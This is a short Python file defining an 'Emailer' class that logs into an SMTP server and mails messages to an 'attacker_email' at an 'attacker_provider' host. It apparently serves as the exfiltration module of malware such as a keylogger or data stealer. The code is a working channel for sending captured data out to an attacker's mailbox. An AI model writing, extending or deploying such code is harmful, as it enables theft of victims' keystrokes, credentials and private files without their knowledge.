import smtplib
import ssl


class Emailer:

    def __init__(self, email="", password="", attacker_email="",
                 port=465, attacker_provider="gmail.com", method=True):
        self.email = email
        self.password = password
        self.port = port

        self.attacker_provider = attacker_provider
        self.attacker_email = attacker_email
        self.method = method

    def send_email(self, message=""):
        if self.method:
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL(f"smtp.{ self.attacker_provider }", self.port,
                                  context=context) as server:
                server.login(self.email, self.password)
                server.sendmail(self.email, self.attacker_email, message)
